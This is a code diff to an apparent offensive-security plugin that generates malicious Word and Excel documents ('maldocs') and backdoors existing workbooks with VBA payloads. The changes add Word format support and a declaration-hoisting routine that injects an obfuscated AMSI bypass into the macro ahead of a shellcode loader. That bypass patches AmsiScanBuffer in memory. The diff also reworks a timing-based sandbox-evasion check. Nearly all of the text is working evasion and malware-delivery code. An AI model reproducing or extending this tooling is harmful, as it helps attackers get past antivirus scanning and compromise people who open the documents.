@@ -7,6 +7,8 @@ Supported formats:
 - XLSM (Excel Macro-Enabled Workbook)
 - XLAM (Excel Add-In)
 - XLS (Excel 97-2003)
+- DOC (Word 97-2003)
+- DOCM (Word Macro-Enabled Document)
 
 Features:
 - Backdoor existing Excel files with VBA payload
@@ -497,17 +499,19 @@ class PayloadMalDocsPlugin(ErebusPlugin):
         Returns:
             str: VBA declarations + bypass Sub to prepend to the module.
         """
-        return '''
-#If VBA7 Then
-Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpFileName As String) As LongPtr
-Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
-Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
-Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long)
+        # All four declarations use unique VBA names (Alias maps to the real API).
+        # This prevents "Duplicate declaration" when the shellcode loader also
+        # declares VirtualProtect / RtlMoveMemory under their canonical names.
+        return '''#If VBA7 Then
+Private Declare PtrSafe Function AmsiLoadLib Lib "kernel32" Alias "LoadLibraryA" (ByVal lpFileName As String) As LongPtr
+Private Declare PtrSafe Function AmsiGetProc Lib "kernel32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
+Private Declare PtrSafe Function AmsiVProtect Lib "kernel32" Alias "VirtualProtect" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
+Private Declare PtrSafe Sub AmsiCopyMem Lib "kernel32" Alias "RtlMoveMemory" (ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long)
 #Else
-Private Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpFileName As String) As Long
-Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
-Private Declare Function VirtualProtect Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
-Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal dest As Long, ByRef src As Any, ByVal length As Long)
+Private Declare Function AmsiLoadLib Lib "kernel32" Alias "LoadLibraryA" (ByVal lpFileName As String) As Long
+Private Declare Function AmsiGetProc Lib "kernel32" Alias "GetProcAddress" (ByVal hModule As Long, ByVal lpProcName As String) As Long
+Private Declare Function AmsiVProtect Lib "kernel32" Alias "VirtualProtect" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
+Private Declare Sub AmsiCopyMem Lib "kernel32" Alias "RtlMoveMemory" (ByVal dest As Long, ByRef src As Any, ByVal length As Long)
 #End If
 
 Private Sub PatchScanBuffer()
@@ -518,13 +522,12 @@ Private Sub PatchScanBuffer()
 
     On Error Resume Next
 
-    hLib = LoadLibrary("am" & "si.d" & "ll")
+    hLib = AmsiLoadLib("am" & "si.d" & "ll")
     If hLib = 0 Then Exit Sub
 
-    pAddr = GetProcAddress(hLib, "Am" & "siSc" & "anBu" & "ffer")
+    pAddr = AmsiGetProc(hLib, "Am" & "siSc" & "anBu" & "ffer")
     If pAddr = 0 Then Exit Sub
 
-    ' mov eax, 0x80070057; ret
     patch(0) = &HB8
     patch(1) = &H57
     patch(2) = &H0
@@ -532,12 +535,59 @@ Private Sub PatchScanBuffer()
     patch(4) = &H80
     patch(5) = &HC3
 
-    If VirtualProtect(pAddr, 6, &H40, oldProt) = 0 Then Exit Sub
-    CopyMemory pAddr, patch(0), 6
-    VirtualProtect pAddr, 6, oldProt, oldProt
+    If AmsiVProtect(pAddr, 6, &H40, oldProt) = 0 Then Exit Sub
+    AmsiCopyMem pAddr, patch(0), 6
+    AmsiVProtect pAddr, 6, oldProt, oldProt
 End Sub
 
 '''
+
+    def _hoist_declarations(self, vba_code: str):
+        """Split VBA source into (declarations, body).
+
+        Declarations: Option statements, #If...#End If conditional blocks,
+        Private/Public/Friend Declare statements (including multi-line with _).
+        Body: everything else (Sub, Function, blank lines after first Sub, etc.).
+        """
+        import re
+        lines = vba_code.split('\n')
+        decl_lines = []
+        body_lines = []
+        in_cond_block = 0
+        in_declare = False
+
+        for line in lines:
+            stripped = line.strip()
+
+            if in_declare:
+                decl_lines.append(line)
+                in_declare = stripped.endswith('_')
+                continue
+
+            if re.match(r'^#If\b', stripped, re.IGNORECASE):
+                in_cond_block += 1
+                decl_lines.append(line)
+            elif in_cond_block > 0 and re.match(r'^#Else\b', stripped, re.IGNORECASE):
+                decl_lines.append(line)
+            elif in_cond_block > 0 and re.match(r'^#End\s+If\b', stripped, re.IGNORECASE):
+                decl_lines.append(line)
+                in_cond_block -= 1
+            elif in_cond_block > 0:
+                decl_lines.append(line)
+            elif re.match(r'^Option\s+', stripped, re.IGNORECASE):
+                decl_lines.append(line)
+            elif re.match(
+                r'^(Private|Public|Friend)?\s*Declare\s+(PtrSafe\s+)?(Function|Sub)\b',
+                stripped, re.IGNORECASE
+            ):
+                decl_lines.append(line)
+                in_declare = stripped.endswith('_')
+            elif not stripped and not body_lines:
+                decl_lines.append(line)
+            else:
+                body_lines.append(line)
+
+        return '\n'.join(decl_lines), '\n'.join(body_lines)
 
     def obfuscate_vba(self, vba_code):
         """
@@ -559,27 +609,40 @@ End Sub
         import re
         import random
 
-        # Prepend AMSI bypass declarations and inject the patch call
         amsi_bypass = self.generate_amsi_bypass_vba()
-        obfuscated = vba_code
 
-        # STEP 0: INJECT AMSI BYPASS
-        # Add declares before the first Sub/Function and inject
-        # PatchScanBuffer call as the first line of the entry Sub
-        sub_match = re.search(r'(Sub\s+\w+\([^)]*\))', obfuscated)
+        # STEP 0: HOIST DECLARATIONS AND INJECT AMSI BYPASS
+        # Split AMSI bypass into its declarations block and PatchScanBuffer Sub.
+        # Split original vba_code into its declarations and Sub/Function body.
+        # Reassemble as: [all decls] → [PatchScanBuffer] → [original body].
+        # This guarantees Option Explicit and all Private Declares land before
+        # any Sub/Function, which VBA requires.
+        amsi_decls, amsi_sub_body = self._hoist_declarations(amsi_bypass)
+        orig_decls, orig_body = self._hoist_declarations(vba_code)
+
+        # Inject PatchScanBuffer call into the first Sub in the original body
+        sub_match = re.search(r'(Sub\s+\w+\([^)]*\))', orig_body)
         if sub_match:
-            # Insert PatchScanBuffer call right after the Sub declaration line
             insert_pos = sub_match.end()
-            obfuscated = obfuscated[:insert_pos] + '\n    PatchScanBuffer\n' + obfuscated[insert_pos:]
-            # Prepend the declarations + PatchScanBuffer Sub before all code
-            obfuscated = amsi_bypass + obfuscated
+            orig_body = orig_body[:insert_pos] + '\n    PatchScanBuffer\n' + orig_body[insert_pos:]
 
-        # STEP 1: EXTRACT AND PRESERVE MODULE STRUCTURE
-        match = re.search(r'(Sub |Function )', obfuscated)
+        # AMSI decls first so AmsiLoadLib/AmsiGetProc/AmsiVProtect/AmsiCopyMem
+        # are declared before PatchScanBuffer references them.
+        module_header = amsi_decls.rstrip('\n') + '\n' + orig_decls.strip('\n') + '\n\n'
+        code_to_obfuscate = amsi_sub_body.strip('\n') + '\n\n' + orig_body.strip('\n') + '\n'
+        obfuscated = module_header + code_to_obfuscate
+
+        # STEP 1: SPLIT FOR PER-BODY OBFUSCATION (variable rename, dead code, etc.)
+        match = re.search(r'(Sub |Function )', code_to_obfuscate)
         if not match:
             return obfuscated
 
-        split_pos = match.start()
+        # module_header already set above; re-derive code_to_obfuscate boundary
+        # relative to the full obfuscated string so STEP 6 reconstruction works.
+        full_match = re.search(r'(Sub |Function )', obfuscated)
+        if not full_match:
+            return obfuscated
+        split_pos = full_match.start()
         module_header = obfuscated[:split_pos]
         code_to_obfuscate = obfuscated[split_pos:]
 
@@ -617,20 +680,20 @@ End Sub
             code_to_obfuscate = re.sub(r'\b' + original + r'\b', obfuscated_name, code_to_obfuscate)
 
         # STEP 4: ADD ANTI-ANALYSIS WRAPPER FUNCTION
-        # Timing-based detection check to slow down dynamic analysis
+        # Timer + DoEvents loop works in both Excel and Word VBA.
+        # Application.Wait is Excel-only and fails in Word-hosted macros.
         anti_analysis = '''
 Private Function Security() As Boolean
-    Dim StartTime As Date
-    Dim EndTime As Date
-    Dim Elapsed As Double
+    Dim t As Single
+    Dim Elapsed As Single
 
     On Error Resume Next
 
-    ' Timing check - detect sandboxes by sleep timing variance
-    StartTime = Now()
-    Application.Wait (Now() + TimeValue("0:00:02"))
-    EndTime = Now()
-    Elapsed = (EndTime - StartTime) * 86400
+    t = Timer
+    Do While Timer < t + 2
+        DoEvents
+    Loop
+    Elapsed = Timer - t
 
     If Elapsed < 1.8 Then
         Exit Function
